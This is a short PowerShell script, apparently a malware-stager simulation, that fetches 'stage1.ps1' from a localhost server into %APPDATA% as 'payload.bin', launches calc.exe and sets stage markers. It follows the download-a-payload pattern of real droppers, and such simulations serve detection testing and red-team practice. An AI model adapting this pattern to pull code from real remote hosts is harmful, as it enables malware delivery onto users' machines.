
<# Remote fetch #>
[CmdletBinding()]
param(
    [string]$RemoteUrl = 'http://localhost:8081/stage1.ps1',
    [string]$LocalPath = "$env:APPDATA\payload.bin",
    [int]$TransferTimeout = 68
)
Invoke-WebRequest -Uri $RemoteUrl -OutFile $LocalPath -UseBasicParsing
Start-Process -FilePath "calc.exe"
Start-Sleep -Seconds 34
$StageMarker = "stage-4"
